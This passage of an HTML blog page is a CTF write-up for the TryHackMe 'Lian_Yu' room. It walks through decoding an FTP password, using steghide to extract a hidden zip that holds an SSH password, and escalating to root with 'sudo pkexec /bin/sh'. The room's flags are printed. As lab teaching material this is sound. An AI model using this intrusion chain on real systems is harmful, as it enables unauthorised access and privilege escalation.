+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo -n <span style="color:#e6db74">&#39;RTy8yhBQdscX&#39;</span> | base58 --decode
+</span></span><span style="display:flex;"><span>!#th3h00d                                                                                                                            
+</span></span></code></pre></div><pre tabindex="0"><code>---&gt; FTP Account:
+- Username: vigilante
+- Password: !#th3h00d  
+</code></pre><h2 id="ftp">FTP<a href="#ftp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I login to <code>FTP Service</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|23932|<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Here comes the directory listing.
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>          <span style="color:#ae81ff">511720</span> May <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">2020</span> Leave_me_alone.png
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>          <span style="color:#ae81ff">549924</span> May <span style="color:#ae81ff">05</span>  <span style="color:#ae81ff">2020</span> Queen<span style="color:#960050;background-color:#1e0010">&#39;</span>s_Gambit.png
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>          <span style="color:#ae81ff">191026</span> May <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">2020</span> aa.jpg
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Directory send OK.
+</span></span></code></pre></div><p>With the <code>get</code> command, I bring all this files in my machine
+I see if there is another directory:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ftp&gt; cd ..
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> Directory successfully changed.
+</span></span><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|19609|<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Here comes the directory listing.
+</span></span><span style="display:flex;"><span>drwx------    <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">1000</span>     <span style="color:#ae81ff">1000</span>         <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">2020</span> slade
+</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">1001</span>     <span style="color:#ae81ff">1001</span>         <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">05</span>  <span style="color:#ae81ff">2020</span> vigilante
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Directory send OK.
+</span></span></code></pre></div><p>So I discover that there is another <code>account</code>:</p>
+<pre tabindex="0"><code>- Username: slade
+</code></pre><h2 id="steganography">Steganography<a href="#steganography" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I see a file between those that I have download, the file <code>Leave_me_alone.png</code>, got me a mistake
+I must fix this error
+I see the default file signature(jpeg) in this site <code>https://en.wikipedia.org/wiki/List_of_file_signatures</code>:</p>
+<p><code>89 50 4E 47 0D 0A 1A 0A</code>   <code>‰PNG␍␊␚␊</code></p>
+<p>I use <code>hexeditor</code> and  edit the firstline, insert the <code>correct signature</code>::</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/imagearrow<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ hexeditor Leave_me_alone.png 
+</span></span></code></pre></div><p>Then I can open  <code>Leave_me_alone.png</code> and I can read a written:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Just Leave me a lone 
+</span></span><span style="display:flex;"><span>Here take it what you want 
+</span></span><span style="display:flex;"><span>password  &lt;-- PassPhrase
+</span></span></code></pre></div><p>I see info of the <code>aa.jpg</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/imagearrow<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ steghide info aa.jpg 
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;aa.jpg&#34;</span>:
+</span></span><span style="display:flex;"><span>  format: jpeg
+</span></span><span style="display:flex;"><span>  capacity: 11.0 KB
+</span></span><span style="display:flex;"><span>Try to get information about embedded data ? <span style="color:#f92672">(</span>y/n<span style="color:#f92672">)</span> y
+</span></span><span style="display:flex;"><span>Enter passphrase: 
+</span></span><span style="display:flex;"><span>  embedded file <span style="color:#e6db74">&#34;ss.zip&#34;</span>:
+</span></span><span style="display:flex;"><span>    size: 596.0 Byte
+</span></span><span style="display:flex;"><span>    encrypted: rijndael-128, cbc
+</span></span><span style="display:flex;"><span>    compressed: yes
+</span></span></code></pre></div><p>I extract the file that hide <code>aa.jpg</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/imagearrow<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ steghide extract -sf  aa.jpg
+</span></span><span style="display:flex;"><span>Enter passphrase: 
+</span></span><span style="display:flex;"><span>wrote extracted data to <span style="color:#e6db74">&#34;ss.zip&#34;</span>.
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/imagearrow<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls
+</span></span><span style="display:flex;"><span> aa.jpg   Leave_me_alone.png   Lianyu.png.gz  <span style="color:#e6db74">&#34;Queen&#39;s_Gambit.png&#34;</span>   ss.zip
+</span></span></code></pre></div><p>I unzip file <code>ss.zip</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/imagearrow<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ unzip ss.zip             
+</span></span><span style="display:flex;"><span>Archive:  ss.zip
+</span></span><span style="display:flex;"><span>  inflating: passwd.txt              
+</span></span><span style="display:flex;"><span>  inflating: shado  
+</span></span></code></pre></div><p>I open <code>passwd.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/imagearrow<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat passwd.txt
+</span></span><span style="display:flex;"><span>This is your visa to Land on Lian_Yu <span style="color:#75715e"># Just for Fun ***</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>a small Note about it
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Having spent years on the island, Oliver learned how to be resourceful and 
+</span></span><span style="display:flex;"><span>set booby traps all over the island in the common event he ran into dangerous
+</span></span><span style="display:flex;"><span>people. The island is also home to many animals, including pheasants,
+</span></span><span style="display:flex;"><span>wild pigs and wolves.
+</span></span></code></pre></div><p>I open <code>shado</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/imagearrow<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat shado    
+</span></span><span style="display:flex;"><span>M3tahuman
+</span></span></code></pre></div><p>What is the file name with SSH password?  <code>shado</code></p>
+<h2 id="vertical-privilege-escalation">Vertical Privilege Escalation<a href="#vertical-privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I login to <code>SSH Service</code>::</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/imagearrow]
+└─$ ssh slade@10.10.104.254     
+slade@10.10.104.254&#39;s password: 
+                              Way To SSH...
+                          Loading.........Done.. 
+                   Connecting To Lian_Yu  Happy Hacking
+
+██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
+██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
+██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
+██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
+╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
+ ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝
+
+
+        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
+        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
+        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
+        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
+        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
+        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  
+</code></pre><p>I find <code>user.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>slade@LianYu:~$ ls
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span>slade@LianYu:~$ cat user.txt
+</span></span><span style="display:flex;"><span>THM<span style="color:#f92672">{</span>P30P7E_K33P_53CRET5__C0MPUT3R5_D0N<span style="color:#960050;background-color:#1e0010">&#39;</span>T<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>                        --Felicity Smoak
+</span></span></code></pre></div><p>I see the <code>sudo privileges</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>slade@LianYu:~$ sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> slade: 
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> slade on LianYu:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User slade may run the following commands on LianYu:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> PASSWD: /usr/bin/pkexec
+</span></span></code></pre></div><p>I spawn the root shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>slade@LianYu:~$ sudo pkexec /bin/sh
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># whoami</span>
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>I get <code>root.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e"># cat /root/root.txt</span>
+</span></span><span style="display:flex;"><span>                          Mission accomplished
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>You are injected me with Mirakuru:<span style="color:#f92672">)</span> ---&gt; Now slade Will become DEATHSTROKE. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>THM<span style="color:#f92672">{</span>MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I<span style="color:#960050;background-color:#1e0010">&#39;</span>LL_BE_D34D<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>                                                                              --DEATHSTROKE
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Let me know your comments about this machine :<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>I will be available @twitter @User6825
+</span></span></code></pre></div>
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/death_note/">
+                <span class="button__text">VulnHub Writeup - Death Note (Easy)</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io">CyberSpider</a></span> 
+    
+        <span>::  </span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
